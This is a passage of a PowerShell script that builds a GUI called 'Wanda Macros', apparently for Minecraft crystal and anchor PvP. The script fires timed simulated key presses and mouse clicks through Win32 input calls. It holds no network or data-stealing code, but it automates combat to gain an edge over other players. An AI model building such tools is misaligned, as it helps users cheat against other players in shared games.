param([switch]$MacroMode)

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
public static class Win32 {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern bool FreeConsole();
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);
    public const int VK_HOME = 0x24;
    public const uint KEYEVENTF_KEYUP     = 0x0002;
    public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const uint MOUSEEVENTF_RIGHTUP   = 0x0010;
    public const uint MOUSEEVENTF_LEFTDOWN  = 0x0002;
    public const uint MOUSEEVENTF_LEFTUP    = 0x0004;
    public const uint MOUSEEVENTF_XDOWN     = 0x0080;
    public const uint MOUSEEVENTF_XUP       = 0x0100;
    public const uint XBUTTON1 = 0x0001;

    public static void PressKey(byte vk) {
        keybd_event(vk, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        keybd_event(vk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }
    public static void RightClick() {
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
    }
    public static void BackClick() {
        mouse_event(MOUSEEVENTF_XDOWN, 0, 0, XBUTTON1, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_XUP, 0, 0, XBUTTON1, UIntPtr.Zero);
    }
    public static void LeftClick() {
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
    }
}
"@

if ($MacroMode) {
    [Win32]::FreeConsole() | Out-Null

    function Get-VKCode {
        param([string]$keyName)
        switch ($keyName) {
            "Mouse1"  { return 0x01 }
            "Mouse2"  { return 0x02 }
            "Mouse3"  { return 0x04 }
            "Mouse4"  { return 0x05 }
            "Mouse5"  { return 0x06 }
            "None"    { return -1 }
            default {
                try {
                    $k = [System.Windows.Forms.Keys]$keyName
                    return [int]$k
                } catch { return -1 }
            }
        }
    }

    function Get-KeyName {
        param([byte]$vk)
        switch ($vk) {
            0x30 { return "0" }
            0x31 { return "1" }
            0x32 { return "2" }
            0x33 { return "3" }
            0x34 { return "4" }
            0x35 { return "5" }
            0x36 { return "6" }
            0x37 { return "7" }
            0x38 { return "8" }
            0x39 { return "9" }
            0x41 { return "A" }
            0x42 { return "B" }
            0x43 { return "C" }
            0x44 { return "D" }
            0x45 { return "E" }
            0x46 { return "F" }
            0x47 { return "G" }
            0x48 { return "H" }
            0x49 { return "I" }
            0x4A { return "J" }
            0x4B { return "K" }
            0x4C { return "L" }
            0x4D { return "M" }
            0x4E { return "N" }
            0x4F { return "O" }
            0x50 { return "P" }
            0x51 { return "Q" }
            0x52 { return "R" }
            0x53 { return "S" }
            0x54 { return "T" }
            0x55 { return "U" }
            0x56 { return "V" }
            0x57 { return "W" }
            0x58 { return "X" }
            0x59 { return "Y" }
            0x5A { return "Z" }
            0x00 { return "None" }
            default { return "0x$($vk.ToString('X2'))" }
        }
    }

    function Run-HitCrystal-OnPress {
        [Win32]::keybd_event($script:hcKey1, 0, 0, [UIntPtr]::Zero)
        [System.Threading.Thread]::Sleep($script:delays.hcPress_swap)
        [Win32]::keybd_event($script:hcKey1, 0, [Win32]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
        [System.Threading.Thread]::Sleep($script:delays.hcPress_afterSwap)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.hcPress_click)
        if ($script:hcAction2 -eq "mouse") {
            [Win32]::BackClick()
        } else {
            [Win32]::keybd_event($script:hcKey2, 0, 0, [UIntPtr]::Zero)
            [System.Threading.Thread]::Sleep($script:delays.hcPress_key2)
            [Win32]::keybd_event($script:hcKey2, 0, [Win32]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
        }
        [System.Threading.Thread]::Sleep($script:delays.hcPress_end)
    }

    function Run-HitCrystal-WhileHolding {
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.hcHold_click)
        [Win32]::LeftClick()
    }

    function Run-SingleAnchor {
        [Win32]::PressKey(0x43)
        [System.Threading.Thread]::Sleep($script:delays.sa_crystal)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.sa_place)
        [Win32]::PressKey($script:ancSlot)
        [System.Threading.Thread]::Sleep($script:delays.sa_slot)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.sa_use)
        if ($script:ancBackAction -eq "mouse") {
            [Win32]::BackClick()
        } else {
            [Win32]::PressKey($script:ancBackKey)
        }
        [System.Threading.Thread]::Sleep($script:delays.sa_back)
        [Win32]::RightClick()
    }

    function Run-DoubleAnchor {
        [Win32]::PressKey(0x43)
        [System.Threading.Thread]::Sleep($script:delays.da_crystal1)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_place1)
        [Win32]::PressKey($script:ancSlot)
        [System.Threading.Thread]::Sleep($script:delays.da_slot1)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_use1)
        [Win32]::PressKey(0x43)
        [System.Threading.Thread]::Sleep($script:delays.da_crystal2)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_place2)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_place3)
        [Win32]::PressKey($script:ancSlot)
        [System.Threading.Thread]::Sleep($script:delays.da_slot2)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_use2)
        if ($script:ancBackAction -eq "mouse") {
            [Win32]::BackClick()
        } else {
            [Win32]::PressKey($script:ancBackKey)
        }
        [System.Threading.Thread]::Sleep($script:delays.da_back)
        [Win32]::RightClick()
    }

    $script:btnStates  = @{ 0 = $false; 1 = $false; 2 = $false }
    $script:btnKeys    = @{ 0 = "None"; 1 = "None"; 2 = "None" }
    $script:btnRefs    = @($null, $null, $null)
    $script:dotRefs    = @($null, $null, $null)
    $script:keyBtns    = @($null, $null, $null)
    $script:listening  = -1
    $script:guiForm    = $null
    $script:homeWasDown = $false
    $script:mbWas  = $false
    $script:xb1Was = $false
    $script:xb2Was = $false
    $script:triggerWas = @{ 0 = $false; 1 = $false; 2 = $false }

    # Custom keybind settings — all user-defined, no presets
    $script:hcKey1        = 0x32   # Hit Crystal swap key (default: 2)
    $script:hcAction2     = "key"  # "key" or "mouse"
    $script:hcKey2        = 0x33   # Hit Crystal second key (default: 3)
    $script:ancSlot       = 0x56   # Anchor slot key (default: V)
    $script:ancBackAction = "mouse" # "key" or "mouse"
    $script:ancBackKey    = 0x00   # Anchor back key (if ancBackAction = "key")

    # Labels for the custom keybind buttons in the GUI
    $script:hcKey1Label       = $null
    $script:hcKey2Label       = $null
    $script:ancSlotLabel      = $null
    $script:ancBackLabel      = $null
    $script:listeningCustom   = ""  # which custom keybind slot is being listened to

    $script:delays = @{
        hcPress_swap      = 2
        hcPress_afterSwap = 1
        hcPress_click     = 25
        hcPress_key2      = 10
        hcPress_end       = 1
        hcHold_click      = 35
        sa_crystal        = 10
        sa_place          = 25
        sa_slot           = 20
        sa_use            = 10
        sa_back           = 10
        da_crystal1       = 15
        da_place1         = 25
        da_slot1          = 25
        da_use1           = 25
        da_crystal2       = 15
        da_place2         = 1
        da_place3         = 25
        da_slot2          = 25
        da_use2           = 25
        da_back           = 15
    }

    function Finish-Listen {
        param([string]$keyName)
        try {
            $ci = $script:listening
            if ($ci -lt 0) { return }
            $script:listening = -1
            $script:btnKeys[$ci] = $keyName
            if ($script:keyBtns[$ci] -and -not $script:keyBtns[$ci].IsDisposed) {
                $script:keyBtns[$ci].Text = $keyName
                $script:keyBtns[$ci].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                $script:keyBtns[$ci].BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
            }
        } catch {}
    }

    function Finish-ListenCustom {
        param([string]$keyName)
        try {
            $slot = $script:listeningCustom
            if ($slot -eq "") { return }
            $script:listeningCustom = ""

            # Map key name back to VK code
            $vk = 0
            switch ($keyName) {
                "Mouse4" { $vk = 0x05 }
                "Mouse5" { $vk = 0x06 }
                "Mouse3" { $vk = 0x04 }
                default {
                    try {
                        $k = [System.Windows.Forms.Keys]$keyName
                        $vk = [int]$k
                    } catch { $vk = 0 }
                }
            }

            switch ($slot) {
                "hcKey1" {
                    $script:hcKey1 = [byte]$vk
                    if ($script:hcKey1Label -and -not $script:hcKey1Label.IsDisposed) {
                        $script:hcKey1Label.Text = $keyName
                        $script:hcKey1Label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                        $script:hcKey1Label.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
                    }
                }
                "hcKey2" {
                    if ($keyName -eq "Mouse4") {
                        $script:hcAction2 = "mouse"
                        $script:hcKey2 = 0x00
                    } else {
                        $script:hcAction2 = "key"
                        $script:hcKey2 = [byte]$vk
                    }
                    if ($script:hcKey2Label -and -not $script:hcKey2Label.IsDisposed) {
                        $script:hcKey2Label.Text = $keyName
                        $script:hcKey2Label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                        $script:hcKey2Label.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
                    }
                }
                "ancSlot" {
                    $script:ancSlot = [byte]$vk
                    if ($script:ancSlotLabel -and -not $script:ancSlotLabel.IsDisposed) {
                        $script:ancSlotLabel.Text = $keyName
                        $script:ancSlotLabel.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                        $script:ancSlotLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
                    }
                }
                "ancBack" {
                    if ($keyName -eq "Mouse4") {
                        $script:ancBackAction = "mouse"
                        $script:ancBackKey = 0x00
                    } else {
                        $script:ancBackAction = "key"
                        $script:ancBackKey = [byte]$vk
                    }
                    if ($script:ancBackLabel -and -not $script:ancBackLabel.IsDisposed) {
                        $script:ancBackLabel.Text = $keyName
                        $script:ancBackLabel.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                        $script:ancBackLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
                    }
                }
            }
        } catch {}
    }

    function New-BrxtwurstForm {
        $w = 620
        $h = 860
        $pad = 28
        $contentW = $w - ($pad * 2)

        $baseBg     = [System.Drawing.ColorTranslator]::FromHtml("#1e1e2e")
        $mantleBg   = [System.Drawing.ColorTranslator]::FromHtml("#181825")
        $surface0   = [System.Drawing.ColorTranslator]::FromHtml("#313244")
        $surface1   = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
        $overlay0   = [System.Drawing.ColorTranslator]::FromHtml("#6c7086")
        $textClr    = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
        $subtextClr = [System.Drawing.ColorTranslator]::FromHtml("#a6adc8")
        $accentClr  = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7")
        $greenClr   = [System.Drawing.ColorTranslator]::FromHtml("#a6e3a1")
        $redClr     = [System.Drawing.ColorTranslator]::FromHtml("#f38ba8")
        $yellowClr  = [System.Drawing.ColorTranslator]::FromHtml("#f9e2af")

        $f = New-Object System.Windows.Forms.Form
        $f.Text            = "Wanda Macros"
        $f.ClientSize      = New-Object System.Drawing.Size($w, $h)
        $f.StartPosition   = "CenterScreen"
        $f.FormBorderStyle = "None"
        $f.BackColor       = $baseBg
        $f.Font            = New-Object System.Drawing.Font("Segoe UI", 10)
        $f.TopMost         = $true
        $f.KeyPreview      = $true
        $f.ShowInTaskbar   = $true
        $f.MinimizeBox     = $true
        $f.Padding         = New-Object System.Windows.Forms.Padding(1)
        $f.Region          = [System.Drawing.Region]::new([System.Drawing.Rectangle]::new(0, 0, $w, $h))

        $f.Add_KeyDown({
            if ($script:listening -ge 0) {
                Finish-Listen $_.KeyCode.ToString()
                $_.Handled = $true
                $_.SuppressKeyPress = $true
            } elseif ($script:listeningCustom -ne "") {
                Finish-ListenCustom $_.KeyCode.ToString()
                $_.Handled = $true
                $_.SuppressKeyPress = $true
            }
        })

        $f.Add_MouseDown({ if ($_.Button -eq "Left") { $this.Tag = $_.Location } })
        $f.Add_MouseMove({
            if ($_.Button -eq "Left" -and $this.Tag) {
                $p = $this.Tag
                $this.Location = New-Object System.Drawing.Point(
                    ($this.Location.X + $_.X - $p.X),
                    ($this.Location.Y + $_.Y - $p.Y))
            }
        })
        $f.Add_MouseUp({ $this.Tag = $null })

        $accent = New-Object System.Windows.Forms.Panel
        $accent.Size      = New-Object System.Drawing.Size($w, 3)
        $accent.Location  = New-Object System.Drawing.Point(0, 0)
        $accent.BackColor = $accentClr
        $accent.Add_MouseDown({ if ($_.Button -eq "Left") { $this.FindForm().Tag = $_.Location } })
        $accent.Add_MouseMove({
            if ($_.Button -eq "Left" -and $this.FindForm().Tag) {
                $p = $this.FindForm().Tag
                $this.FindForm().Location = New-Object System.Drawing.Point(
                    ($this.FindForm().Location.X + $_.X - $p.X),
                    ($this.FindForm().Location.Y + $_.Y - $p.Y))
            }
        })
        $accent.Add_MouseUp({ $this.FindForm().Tag = $null })
        $f.Controls.Add($accent)

        $titleLbl = New-Object System.Windows.Forms.Label
        $titleLbl.Text      = "Wanda Macros"
        $titleLbl.ForeColor = $textClr
        $titleLbl.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 16)
        $titleLbl.AutoSize  = $false
        $titleLbl.Size      = New-Object System.Drawing.Size($w, 42)
        $titleLbl.Location  = New-Object System.Drawing.Point(0, 12)
        $titleLbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
        $titleLbl.Add_MouseDown({ if ($_.Button -eq "Left") { $this.FindForm().Tag = $_.Location } })
        $titleLbl.Add_MouseMove({
            if ($_.Button -eq "Left" -and $this.FindForm().Tag) {
                $p = $this.FindForm().Tag
                $this.FindForm().Location = New-Object System.Drawing.Point(
                    ($this.FindForm().Location.X + $_.X - $p.X),
                    ($this.FindForm().Location.Y + $_.Y - $p.Y))
            }
        })
        $titleLbl.Add_MouseUp({ $this.FindForm().Tag = $null })
        $f.Controls.Add($titleLbl)

        $minBtn = New-Object System.Windows.Forms.Label
        $minBtn.Text      = [char]0x2015
        $minBtn.ForeColor = $overlay0
        $minBtn.Font      = New-Object System.Drawing.Font("Segoe UI", 11)
        $minBtn.AutoSize  = $true
        $minBtn.Location  = New-Object System.Drawing.Point(($w - 58), 8)
        $minBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $minBtn.Add_Click({ $this.FindForm().WindowState = [System.Windows.Forms.FormWindowState]::Minimized })
        $minBtn.Add_MouseEnter({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7") })
        $minBtn.Add_MouseLeave({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086") })
        $f.Controls.Add($minBtn)

        $xBtn = New-Object System.Windows.Forms.Label
        $xBtn.Text      = [char]0x2715
        $xBtn.ForeColor = $overlay0
        $xBtn.Font      = New-Object System.Drawing.Font("Segoe UI", 11)
        $xBtn.AutoSize  = $true
        $xBtn.Location  = New-Object System.Drawing.Point(($w - 30), 8)
        $xBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $xBtn.Add_Click({ $this.FindForm().Hide() })
        $xBtn.Add_MouseEnter({ $this.ForeColor = $redClr })
        $xBtn.Add_MouseLeave({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086") })
        $f.Controls.Add($xBtn)

        $sep = New-Object System.Windows.Forms.Panel
        $sep.Size      = New-Object System.Drawing.Size($contentW, 1)
        $sep.Location  = New-Object System.Drawing.Point($pad, 60)
        $sep.BackColor = $surface0
        $f.Controls.Add($sep)

        $scroll = New-Object System.Windows.Forms.Panel
        $scroll.Location   = New-Object System.Drawing.Point(0, 66)
        $scroll.Size       = New-Object System.Drawing.Size($w, ($h - 66))
        $scroll.AutoScroll = $true
        $scroll.BackColor  = $baseBg
        $f.Controls.Add($scroll)

        $cy = 10
        $nudW = 80

        # ===== CUSTOM KEYBIND SETTINGS =====
        $customHdr = New-Object System.Windows.Forms.Label
        $customHdr.Text      = "CUSTOM KEYBIND SETTINGS"
        $customHdr.ForeColor = $accentClr
        $customHdr.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 9)
        $customHdr.AutoSize  = $false
        $customHdr.Size      = New-Object System.Drawing.Size($contentW, 22)
        $customHdr.Location  = New-Object System.Drawing.Point($pad, $cy)
        $scroll.Controls.Add($customHdr)
        $cy += 28

        $customCard = New-Object System.Windows.Forms.Panel
        $customCard.Size      = New-Object System.Drawing.Size($contentW, 178)
        $customCard.Location  = New-Object System.Drawing.Point($pad, $cy)
        $customCard.BackColor = $mantleBg
        $scroll.Controls.Add($customCard)

        $customBinds = @(
            @{ Slot = "hcKey1";  Label = "Hit Crystal — Swap Key";      Hint = "Key pressed to swap to crystal" },
            @{ Slot = "hcKey2";  Label = "Hit Crystal — Second Key";     Hint = "Key/Mouse4 after right click" },
            @{ Slot = "ancSlot"; Label = "Anchor — Slot Key";            Hint = "Key for the anchor inventory slot" },
            @{ Slot = "ancBack"; Label = "Anchor — Back Action";         Hint = "Key/Mouse4 to switch back" }
        )

        $bindBtnW = 110
        $iy = 10
        foreach ($bind in $customBinds) {
            $lbl = New-Object System.Windows.Forms.Label
            $lbl.Text      = $bind.Label
            $lbl.ForeColor = $textClr
            $lbl.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 9.5)
            $lbl.AutoSize  = $false
            $lbl.Size      = New-Object System.Drawing.Size(($contentW - $bindBtnW - 24), 18)
            $lbl.Location  = New-Object System.Drawing.Point(14, $iy)
            $lbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
            $customCard.Controls.Add($lbl)

            $hint = New-Object System.Windows.Forms.Label
            $hint.Text      = $bind.Hint
            $hint.ForeColor = $overlay0
            $hint.Font      = New-Object System.Drawing.Font("Segoe UI", 7.5)
            $hint.AutoSize  = $false
            $hint.Size      = New-Object System.Drawing.Size(($contentW - $bindBtnW - 24), 14)
            $hint.Location  = New-Object System.Drawing.Point(14, ($iy + 18))
            $hint.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
            $customCard.Controls.Add($hint)

            # Determine current value label
            $curText = switch ($bind.Slot) {
                "hcKey1"  { Get-KeyName $script:hcKey1 }
                "hcKey2"  { if ($script:hcAction2 -eq "mouse") { "Mouse4" } else { Get-KeyName $script:hcKey2 } }
                "ancSlot" { Get-KeyName $script:ancSlot }
                "ancBack" { if ($script:ancBackAction -eq "mouse") { "Mouse4" } else { Get-KeyName $script:ancBackKey } }
            }

            $bindBtn = New-Object System.Windows.Forms.Button
            $bindBtn.Text      = $curText
            $bindBtn.Size      = New-Object System.Drawing.Size($bindBtnW, 36)
            $bindBtn.Location  = New-Object System.Drawing.Point(($contentW - $bindBtnW - 8), ($iy - 2))
            $bindBtn.FlatStyle = "Flat"
            $bindBtn.FlatAppearance.BorderSize         = 1
            $bindBtn.FlatAppearance.BorderColor        = $surface0
            $bindBtn.FlatAppearance.MouseOverBackColor = $surface0
            $bindBtn.FlatAppearance.MouseDownBackColor = $accentClr
            $bindBtn.BackColor = $baseBg
            $bindBtn.ForeColor = $textClr
            $bindBtn.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 9)
            $bindBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
            $bindBtn.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
            $bindBtn.Tag       = $bind.Slot

            $bindBtn.Add_Click({
                $slot = $this.Tag
                # Cancel any other listening
                if ($script:listening -ge 0) {
                    $prev = $script:listening
                    $script:listening = -1
                    try {
                        if ($script:btnKeys[$prev] -eq "None") {
                            $script:keyBtns[$prev].Text = "..."
                            $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
                        } else {
                            $script:keyBtns[$prev].Text = $script:btnKeys[$prev]
                            $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                        }
                        $script:keyBtns[$prev].BackColor = [System.Drawing.ColorTranslator]::FromHtml("#1e1e2e")
                    } catch {}
                }
                $script:listeningCustom = $slot
                $this.Text = "..."
                $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#f9e2af")
                $this.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")

                # Store ref for Finish-ListenCustom to update
                switch ($slot) {
                    "hcKey1"  { $script:hcKey1Label  = $this }
                    "hcKey2"  { $script:hcKey2Label  = $this }
                    "ancSlot" { $script:ancSlotLabel = $this }
                    "ancBack" { $script:ancBackLabel = $this }
                }
            })

            $customCard.Controls.Add($bindBtn)
            $iy += 42
        }

        $cy += 178 + 12

        # ===== MACRO SECTIONS =====
        $macroSections = @(
            @{
                Index = 0
                Name  = "Hit Crystal"
                DelayGroups = @(
                    @{ Header = "ON PRESS"; Items = @(
                        @{ Key = "hcPress_swap"; Label = "After swap key down" },
                        @{ Key = "hcPress_afterSwap"; Label = "After swap key up" },
                        @{ Key = "hcPress_click"; Label = "After right click" },
                        @{ Key = "hcPress_key2"; Label = "After second key" },
                        @{ Key = "hcPress_end"; Label = "End delay" }
                    )},
                    @{ Header = "WHILE HELD"; Items = @(
                        @{ Key = "hcHold_click"; Label = "After right click" }
                    )}
                )
            },
            @{
                Index = 1
                Name  = "Single Anchor"
                DelayGroups = @(
                    @{ Header = "DELAYS"; Items = @(
                        @{ Key = "sa_crystal"; Label = "After crystal key" },
                        @{ Key = "sa_place"; Label = "After place click" },
                        @{ Key = "sa_slot"; Label = "After slot key" },
                        @{ Key = "sa_use"; Label = "After use click" },
                        @{ Key = "sa_back"; Label = "After back action" }
                    )}
                )
            },
            @{
                Index = 2
                Name  = "Double Anchor"
                DelayGroups = @(
                    @{ Header = "DELAYS"; Items = @(
                        @{ Key = "da_crystal1"; Label = "After crystal key 1" },
                        @{ Key = "da_place1"; Label = "After place click 1" },
                        @{ Key = "da_slot1"; Label = "After slot key 1" },
                        @{ Key = "da_use1"; Label = "After use click 1" },
                        @{ Key = "da_crystal2"; Label = "After crystal key 2" },
                        @{ Key = "da_place2"; Label = "After quick click" },
                        @{ Key = "da_place3"; Label = "After hit click" },
                        @{ Key = "da_slot2"; Label = "After slot key 2" },
                        @{ Key = "da_use2"; Label = "After use click 2" },
                        @{ Key = "da_back"; Label = "After back action" }
                    )}
                )
            }
        )

        foreach ($section in $macroSections) {
            $idx = $section.Index

            $sSep = New-Object System.Windows.Forms.Panel
            $sSep.Size      = New-Object System.Drawing.Size($contentW, 1)
            $sSep.Location  = New-Object System.Drawing.Point($pad, $cy)
            $sSep.BackColor = $surface0
            $scroll.Controls.Add($sSep)
            $cy += 16

            $cardInnerH = 50
            foreach ($dg in $section.DelayGroups) { $cardInnerH += 28 + ($dg.Items.Count * 32) + 6 }
            $cardH = $cardInnerH + 8

            $card = New-Object System.Windows.Forms.Panel
            $card.Size      = New-Object System.Drawing.Size($contentW, $cardH)
            $card.Location  = New-Object System.Drawing.Point($pad, $cy)
            $card.BackColor = $mantleBg
            $scroll.Controls.Add($card)

            $iy = 8

            $dot = New-Object System.Windows.Forms.Panel
            $dot.Size     = New-Object System.Drawing.Size(10, 10)
            $dot.Location = New-Object System.Drawing.Point(14, ($iy + 13))
            if ($script:btnStates[$idx]) { $dot.BackColor = $greenClr } else { $dot.BackColor = $surface1 }
            $card.Controls.Add($dot)
            $script:dotRefs[$idx] = $dot

            $nameLbl = New-Object System.Windows.Forms.Label
            $nameLbl.Text      = $section.Name
            $nameLbl.ForeColor = $textClr
            $nameLbl.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 12)
            $nameLbl.AutoSize  = $false
            $nameLbl.Size      = New-Object System.Drawing.Size(($contentW - 210), 36)
            $nameLbl.Location  = New-Object System.Drawing.Point(32, $iy)
            $nameLbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
            $card.Controls.Add($nameLbl)

            $toggleW = 72
            $toggleH = 34
            $b = New-Object System.Windows.Forms.Button
            if ($script:btnStates[$idx]) { $b.Text = "ON" } else { $b.Text = "OFF" }
            $b.Size      = New-Object System.Drawing.Size($toggleW, $toggleH)
            $b.Location  = New-Object System.Drawing.Point(($contentW - $toggleW - $nudW - 18), ($iy + 1))
            $b.FlatStyle = "Flat"
            $b.FlatAppearance.BorderSize         = 1
            $b.FlatAppearance.MouseOverBackColor = $surface0
            $b.FlatAppearance.MouseDownBackColor = $accentClr
            $b.BackColor = $baseBg
            $b.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 10)
            $b.Cursor    = [System.Windows.Forms.Cursors]::Hand
            $b.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
            $b.Tag       = $idx
            if ($script:btnStates[$idx]) {
                $b.ForeColor = $greenClr
                $b.FlatAppearance.BorderColor = $greenClr
            } else {
                $b.ForeColor = $surface1
                $b.FlatAppearance.BorderColor = $surface0
            }
            $b.Add_Click({
                $ci = $this.Tag
                $script:btnStates[$ci] = -not $script:btnStates[$ci]
                $isOn = $script:btnStates[$ci]
                $gn = [System.Drawing.ColorTranslator]::FromHtml("#a6e3a1")
                $gy = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
                $bd = [System.Drawing.ColorTranslator]::FromHtml("#313244")
                if ($isOn) {
                    $this.Text = "ON"
                    $this.ForeColor = $gn
                    $this.FlatAppearance.BorderColor = $gn
                    $script:dotRefs[$ci].BackColor   = $gn
                } else {
                    $this.Text = "OFF"
                    $this.ForeColor = $gy
                    $this.FlatAppearance.BorderColor = $bd
                    $script:dotRefs[$ci].BackColor   = $gy
                }
            })
            $card.Controls.Add($b)
            $script:btnRefs[$idx] = $b

            $kb = New-Object System.Windows.Forms.Button
            $kb.Size      = New-Object System.Drawing.Size($nudW, $toggleH)
            $kb.Location  = New-Object System.Drawing.Point(($contentW - $nudW - 8), ($iy + 1))
            $kb.FlatStyle = "Flat"
            $kb.FlatAppearance.BorderSize         = 1
            $kb.FlatAppearance.BorderColor        = $surface0
            $kb.FlatAppearance.MouseOverBackColor = $surface0
            $kb.FlatAppearance.MouseDownBackColor = $accentClr
            $kb.BackColor = $baseBg
            $kb.ForeColor = $surface1
            $kb.Font      = New-Object System.Drawing.Font("Segoe UI", 9)
            $kb.Cursor    = [System.Windows.Forms.Cursors]::Hand
            $kb.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
            $kb.Tag       = $idx
            if ($script:btnKeys[$idx] -eq "None") {
                $kb.Text = "..."
            } else {
                $kb.Text = $script:btnKeys[$idx]
                $kb.ForeColor = $textClr
            }
            $kb.Add_Click({
                $ci = $this.Tag
                # Cancel any custom listening
                $script:listeningCustom = ""
                if ($script:listening -ge 0 -and $script:listening -ne $ci) {
                    try {
                        $prev = $script:listening
                        if ($script:btnKeys[$prev] -eq "None") {
                            $script:keyBtns[$prev].Text = "..."
                            $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
                        } else {
                            $script:keyBtns[$prev].Text = $script:btnKeys[$prev]
                            $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                        }
                        $script:keyBtns[$prev].BackColor = [System.Drawing.ColorTranslator]::FromHtml("#1e1e2e")
                    } catch {}
                }
                $script:listening = $ci
                $this.Text = "..."
                $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#f9e2af")
                $this.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
            })
            $card.Controls.Add($kb)
            $script:keyBtns[$idx] = $kb

            $dot.BringToFront()
            $iy += 44

            foreach ($group in $section.DelayGroups) {
                $ghdr = New-Object System.Windows.Forms.Label
                $ghdr.Text      = $group.Header
                $ghdr.ForeColor = $accentClr
                $ghdr.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 8.5)
                $ghdr.AutoSize  = $false
                $ghdr.Size      = New-Object System.Drawing.Size(($contentW - $nudW - 30), 22)
                $ghdr.Location  = New-Object System.Drawing.Point(14, $iy)
                $card.Controls.Add($ghdr)

                $msLbl = New-Object System.Windows.Forms.Label
                $msLbl.Text      = "ms"
                $msLbl.ForeColor = $surface1
                $msLbl.Font      = New-Object System.Drawing.Font("Segoe UI", 8)
                $msLbl.AutoSize  = $false
                $msLbl.Size      = New-Object System.Drawing.Size($nudW, 22)
                $msLbl.Location  = New-Object System.Drawing.Point(($contentW - $nudW - 8), $iy)
                $msLbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
                $card.Controls.Add($msLbl)
                $iy += 24

                foreach ($item in $group.Items) {
                    $dlbl = New-Object System.Windows.Forms.Label
                    $dlbl.Text      = $item.Label
                    $dlbl.ForeColor = $subtextClr
                    $dlbl.Font      = New-Object System.Drawing.Font("Segoe UI", 9.5)
                    $dlbl.AutoSize  = $false
                    $dlbl.Size      = New-Object System.Drawing.Size(($contentW - $nudW - 40), 28)
                    $dlbl.Location  = New-Object System.Drawing.Point(28, $iy)
                    $dlbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
                    $card.Controls.Add($dlbl)

